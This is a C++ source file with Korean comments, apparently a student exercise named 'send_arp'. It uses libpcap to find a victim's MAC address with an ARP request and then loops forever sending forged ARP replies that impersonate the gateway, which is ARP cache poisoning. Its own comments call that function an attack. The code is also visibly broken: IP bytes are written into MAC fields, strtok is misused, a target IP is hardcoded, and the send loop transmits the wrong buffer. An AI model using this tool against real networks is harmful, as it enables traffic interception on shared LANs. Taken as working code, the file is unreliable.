#include <iostream>
#include <pcap/pcap.h>
#include <netinet/in.h>
#include <cstring>
#include "PHeader.h"
#include <string.h>
#include <zconf.h>

#define Request 0x0001
#define Reply 0x0002
#define ARP 0x0806


// broadcast 보내는 packet
//헤더의 내용을 다 맞춰서 생성해야한다.
void make_sender_packet(struct combine_packet* compacket, u_char* sArr){

    int i=0;
    u_char temp[] = {0xff,0xff,0xff,0xff,0xff,0xff};
    // 브로드캐스트를 위해 FF.FF.FF.FF를 저장함

    for(i=0;i<6;i++) // ether_destination host 에 ff.ff.ff.ff를 저장함
    {
        compacket->ether.ether_dhost[i] = temp[i];
    }

    for(i=0;i<6;i++) // ether_source에 값 저장
    {
        compacket->ether.ether_shost[i] = temp[i]; // 아무값이나 상관없음
    }

    compacket->ether.ether_type = htons(ARP); //ether_type 저장

    compacket->arp.hd_type =htons(0x0001);
    compacket->arp.pr_type =htons(0x0800);
    compacket->arp.hd_size =0x06;
    compacket->arp.pr_size =0x04;


    compacket->arp.opCode = htons(Request);  //when request,

    for(i=0;i<6;i++) // arp_sender_mac_ad 값 저장
    {
        compacket->arp.send_mac_ad[i] = temp[i]; // 아무값이나 상관없음
    }


    for(i=0;i<4;i++) // 내 주소값
    {compacket->arp.send_ip_ad[i] = temp[i]; // 아무값이나 상관없음

    }

    uint8_t sss[6] = {0,0,0,0,0,0};
    memcpy(compacket->arp.target_mac_ad, sss, 6);// 아무값이나 상관없음


    for(i=0;i<6;i++)
    {
        compacket->arp.target_ip_ad[i] = sArr[i]; // 아무값이나 상관없음
    }

}

// sender mac 주소 저장하는 함수
int get_target_mac(const int8_t* packet,char* get_mac){
    int i;

   if( packet[12] == 0x08 && packet[13] == 0x06 && packet[21] == 0x02 )
   {
       for(i=0;i<6;i++)
       {
           get_mac[i]=packet[i];
       }
       return true;

   }
   return false;

}

// 공격
void make_attacker_packet(struct combine_packet* compacket, u_char* sender_ip,u_char* gateway_ip){
    //TODO str에  sender패킷이 되기위함을 준비
    // 패킷에 FFFFF~ 와 gateway, sender ip를 설정한다.
    // 그러면 str에 다 담겨있으니까 이거 호출되면 sendpacket하면 된다!!!!!!!!!!!!
    int i=0;
    u_char temp[] = {0,0,0,0,0,0};
    char mac[6];


    get_target_mac((int8_t*) compacket,mac);


    for(i=0;i<6;i++)
    {
        compacket->ether.ether_dhost[i] = sender_ip[i];
    }


    for(i=0;i<6;i++)
    {
        compacket->ether.ether_shost[i] = gateway_ip[i];
    }

    compacket->ether.ether_type = htons(ARP);

    compacket->arp.hd_type =htons(0x0001);
    compacket->arp.pr_type =htons(0x0800);
    compacket->arp.pr_size =0x04;
    compacket->arp.hd_size =0x06;


    compacket->arp.opCode = htons(Reply);  //when reply,


    for(i=0;i<6;i++)
    {compacket->arp.send_mac_ad[i] = sender_ip[i];}

    for(i=0;i<4;i++)
    {compacket->arp.send_ip_ad[i] = gateway_ip[i];}


    for(i=0;i<6;i++)
    {compacket->arp.target_mac_ad[i] = mac[i];}


    for(i=0;i<4;i++)
    {compacket->arp.target_ip_ad[i] = temp[i];}


}


int main(int argc, char* argv[]) {

    // pcap api
    struct pcap_pkthdr *header;
    struct combine_packet compacket;
    const unsigned char *packet;
    char send_MAC[6];
    int res;
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];


    int i = 0;
    char *gateway_ip = argv[3];
    char sArr[4] = {0,};
    char* sender_ip = strtok(argv[2], "."); //공백을 기준으로 문자열 나눔

    while (sender_ip != NULL)  // 공백이 나올때까지 계속 문자열을 자름
    {
        sArr[i] = (u_char)sender_ip[i];
        i++;

        sender_ip = strtok(NULL, " ");
    }


    printf("=======================\n");



    make_sender_packet(&compacket, (u_char *)sArr); // broadcast로 보내는 패킷

    // TODO test끝나면 주석 지울것.
    /*
    if (argc != 4)  // 오류처리
    {
        printf("USAGE : send_arp <interface> <sender ip> <target ip>\n");
        return -1;
    }
     */
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    // 패킷캡처

    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }


    uint8_t buf[42];
    uint8_t tip[4] = {192, 168, 41, 10};
    memcpy(buf, &compacket, 42 - 4);
    memcpy(buf + (42 - 4), tip, 4);

    printf("%x %x %x %x", buf[38], buf[39], buf[40], buf[41]);
        pcap_sendpacket(handle, buf, 42);

    while (true) {

       res = pcap_next_ex(handle, &header, &packet);

        // 패킷 읽어옴
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct ethernet_header* ether = (struct ethernet_header*)packet;

        if(get_target_mac((const int8_t*)packet, send_MAC) == true){
            break;
        }
        else{
            continue;}
    }

    printf(" \n========while DONE==============\n");

    make_attacker_packet(&compacket,(u_char*)&sender_ip,(u_char*)&gateway_ip );

    while(true) {
        pcap_sendpacket(handle, (const u_char *) &packet, 42);
        sleep(1);
    }

    // 공격패킷 부르기
    // make_sender_packet(&compacket,(u_char*)sender_ip,(u_char*)gateway_ip); // broadcast로 보내는 패킷
    // make_sender_packet의 필요한 부분만 변경해서 반환시킴






    return 0;
}